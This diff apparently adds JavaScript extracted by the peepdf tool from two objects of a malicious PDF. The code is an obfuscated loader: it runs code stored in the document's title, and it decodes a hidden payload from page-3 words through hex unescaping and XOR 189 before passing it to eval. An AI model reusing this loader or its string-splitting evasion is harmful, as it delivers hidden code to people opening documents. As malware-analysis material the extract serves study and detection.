@@ -1,0 +1,26 @@
+// peepdf comment: Javascript code located in object 23 (version 0)
+
+var float = 'i',
+    Qwerty = Function,
+    fontSize = 'title';
+var d = this.info[fontSize];
+Qwerty(d)();
+d = null;
+
+// peepdf comment: Javascript code located in object 25 (version 0)
+
+var b = '',
+    x = '%',
+    z = app.doc;
+var v = z['getPag' + 'eNu' + 'mWords'](3);
+var xE = 189;
+var yL = z['unes' + 'cape'];
+var vK = String;
+for (var yLU = 0; yLU < v; yLU++) {
+    oX = z['getPag' + 'eNt' + 'hWord'](3, yLU);
+    var l = oX['subs' + 'tr'](oX.length - 2, 2);
+    var xEH = yL(x + l)['charCo' + 'deAt'](0);
+    b += vK['from' + 'CharC' + 'ode'](xEH ^ xE);
+}
+eval(b);
+
